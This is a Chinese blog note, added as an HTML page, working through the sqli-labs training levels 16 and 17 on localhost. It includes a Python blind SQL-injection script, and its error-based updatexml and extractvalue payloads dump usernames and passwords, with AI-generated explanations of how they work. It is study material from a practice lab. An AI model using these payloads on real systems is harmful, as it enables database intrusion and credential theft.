@@ -1,0 +1,680 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
+  <link rel="icon" href="/img/logo.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="aidemofashi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sql-labs-less16先找一下注入点 1uname&#x3D;1&amp;passwd&#x3D;1&quot;) or true#&amp;submit&#x3D;Submit 尝试报错注入，无果进行盲注改一下less14的脚本来用： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:type" content="article">
+<meta property="og:title" content="note-09">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/03/09/note-09/index.html">
+<meta property="og:site_name" content="aidemofashi&#39;s blog">
+<meta property="og:description" content="sql-labs-less16先找一下注入点 1uname&#x3D;1&amp;passwd&#x3D;1&quot;) or true#&amp;submit&#x3D;Submit 尝试报错注入，无果进行盲注改一下less14的脚本来用： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-08T18:27:08.000Z">
+<meta property="article:modified_time" content="2025-03-08T21:14:14.012Z">
+<meta property="article:author" content="aidemofashi">
+<meta property="article:tag" content="sql-labs">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>note-09 - aidemofashi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>aidemofashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="note-09"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-09 02:27" pubdate>
+          2025年3月9日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.4k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">note-09</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="sql-labs-less16"><a href="#sql-labs-less16" class="headerlink" title="sql-labs-less16"></a>sql-labs-less16</h1><p>先找一下注入点</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot;) or true#&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+<p>尝试报错注入，无果<br>进行盲注<br>改一下less14的脚本来用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># 网站路径</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-16/&quot;</span><br><span class="hljs-comment"># 判断长度的payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or length(</span><br><span class="hljs-string">	(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># 枚举字符的payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&quot;) or ascii(</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;l&#125;,1)) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post请求参数</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a“ or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># 判断长度</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># 修改请求参数</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># 出现此内容为登录成功</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;测试成功，长度为：&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在测试长度：&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># 枚举字符</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># 从第一个字符开始截取</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># 枚举字符的每一种可能性</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;第&#x27;</span>, l, <span class="hljs-string">&#x27;个字符枚举成功：&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br><br></code></pre></td></tr></table></figure>
+<p>by：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a><br>只用改payload中的，两个都要改不然字长对不上  </p>
+<h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>输入正确的账户和密码：admin，admin<br>提示密码已更新<br>看来页面是能对原有用户密码进行修改<br>在less1确认了猜测是正确的。<br>没想法了去查博客，<br>查看页面源码，是对username做了过滤，会先检查库里是否有对应username<br>只能从password注入</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span><br>或者<br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(select group_concat(<span class="hljs-built_in">id</span>,username,password) <span class="hljs-keyword">from</span> users),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>
+<p>回显  </p>
+<blockquote>
+<p>You can’t specify target table ‘users’ for update in FROM clause  </p>
+</blockquote>
+<p>看来是不能直接爆表  </p>
+<blockquote>
+<p>原因是mysql数据不支持查询和更新是同一张表。所以我们需要加一个中间表。这个关卡需要输入正确账号因为是密码重置页面，所以爆出的是该账户的原始密码。如果查询时不是users表就不会报错。</p>
+</blockquote>
+<p>此payload创建了新的临时表x来避免对正在更新的users表进行直接查询</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">123456</span><span class="hljs-string">&#x27; and extractvalue(1,concat(0x7e,(select * from(select concat(username,&#x27;</span>:<span class="hljs-string">&#x27;,password) from users limit 0,1)x)))#</span><br></code></pre></td></tr></table></figure>
+
+<p>KIMI:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; OR (updatexml(1,concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;,(SELECT concat_ws(&#x27;</span>:<span class="hljs-string">&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1)),1))#  </span><br><span class="hljs-string">```  </span><br><span class="hljs-string">updatxml()</span><br><span class="hljs-string">```sql</span><br><span class="hljs-string">updatexml(1, concat(&#x27;</span><span class="hljs-operator">!</span><span class="hljs-string">&#x27;, data), 1)  </span><br><span class="hljs-string">如果data是一个查询结果，那么当updatexml()函数执行时，会因为xpath_expr不符合要求而报错，</span><br><span class="hljs-string">错误信息中会包含data的内容。  </span><br></code></pre></td></tr></table></figure>
+<p>数据查询部分：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, username, password) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">FROM</span> users)text LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>功能：  </p>
+<blockquote>
+<p>SELECT username, password FROM users：从users表中查询username和password字段。<br>(……)text：这是一个派生表（子查询的结果被当作一个临时表），命名为text。派生表的作用是绕过某些SQL注入场景中对直接查询表的限制。<br>concat_ws(‘:’, username, password)：将username和password字段用冒号（:）拼接成一个字符串，例如admin:password123。<br>LIMIT 0,1：限制查询结果只返回第一行数据。<br>作用：<br>从users表中提取用户名和密码，并将它们拼接成一个字符串，作为updatexml()函数的第二个参数。  </p>
+</blockquote>
+<p>执行过程：  </p>
+<blockquote>
+<p>闭合原语句并注入逻辑： OR操作使得注入的语句能够被执行。<br>查询数据： 从users表中提取用户名和密码，并拼接成一个字符串。<br>触发报错： 将拼接后的字符串作为updatexml()的第二个参数，触发报错。<br>泄露数据： 报错信息中会包含拼接后的字符串，从而泄露用户名和密码。<br>返回结果：<br>当这个注入语句执行时，MySQL会返回一个错误信息，类似如下：<br>XPATH syntax error: ‘!admin:password123’<br>从这个错误信息中，我们可以提取出admin:password123，从而获取到用户名和密码。</p>
+</blockquote>
+<h2 id="group-by报错注入"><a href="#group-by报错注入" class="headerlink" title="group by报错注入"></a>group by报错注入</h2><p>不想看了，反正先知道有这个group by报错注入</p>
+<h2 id="函数说明-错误说明"><a href="#函数说明-错误说明" class="headerlink" title="函数说明,错误说明"></a>函数说明,错误说明</h2><h3 id="concat-ws"><a href="#concat-ws" class="headerlink" title="concat_ws()"></a>concat_ws()</h3><p>语法：concat_ws(separator, str1, str2, …, strN)<br>功能：将两个或多个字符串用指定的分隔符连接起来，返回连接后的字符串。<br>特点：<br>第一个参数是分隔符，后续参数是要连接的字符串。<br>如果分隔符为 NULL，则结果为 NULL。<br>如果某个字符串为 NULL，则在连接时会跳过该字符串。  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> concat_ws(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;用户名&#x27;</span>, <span class="hljs-string">&#x27;密码&#x27;</span>, <span class="hljs-string">&#x27;邮箱&#x27;</span>);<br><span class="hljs-comment">-- 结果：用户名:密码:邮箱</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="extractvalue函数"><a href="#extractvalue函数" class="headerlink" title="extractvalue函数"></a>extractvalue函数</h3><blockquote>
+<p>1’ and extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)# </p>
+</blockquote>
+<p>回显  </p>
+<blockquote>
+<p>Incorrect parameter count in the call to native function ‘extractvalue’</p>
+</blockquote>
+<p>KIMI：<br>出现这个错误是因为extractvalue()函数的参数数量不正确。extractvalue()函数在mysql中用于从xml数据中提取值，它的语法是：  </p>
+<blockquote>
+<p>extractvalue(xml_target, xpath_expression)  </p>
+</blockquote>
+<p>它只接受两个参数：<br>xml_target：要从中提取值的xml数据。<br>xpath_expression：用于定位xml数据中特定节点的xpath表达式。<br>而在你的payload中：  </p>
+<blockquote>
+<p>extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)  </p>
+</blockquote>
+<p>你传递了三个参数给extractvalue()函数，这显然不符合它的定义，因此mysql会报错，提示参数数量不正确。<br>正确的用法示例<br>如果你想使用extractvalue()函数来进行sql注入并获取数据，可以参考以下payload：  </p>
+<blockquote>
+<p>1’ and extractvalue(1, concat(0x7e,(select group_concat(id,username,password) from users),0x7e))#  </p>
+</blockquote>
+<p>这里只传递了两个参数给extractvalue()函数，符合它的定义，因此不会出现参数数量错误的问题。</p>
+<h3 id="派生表"><a href="#派生表" class="headerlink" title="派生表"></a>派生表</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">(... ...)word<br>(<span class="hljs-selector-tag">SELECT</span> username, password <span class="hljs-selector-tag">FROM</span> users)<span class="hljs-selector-tag">text</span> #为派生表<span class="hljs-selector-tag">text</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/sql-labs/" class="print-no-link">#sql-labs</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>note-09</div>
+      <div>https://aidemofashi.github.io/2025/03/09/note-09/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>aidemofashi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月9日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/10/note-10/" title="note-10">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">note-10</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/07/note-08/" title="note-08">
+                        <span class="hidden-mobile">note-08</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
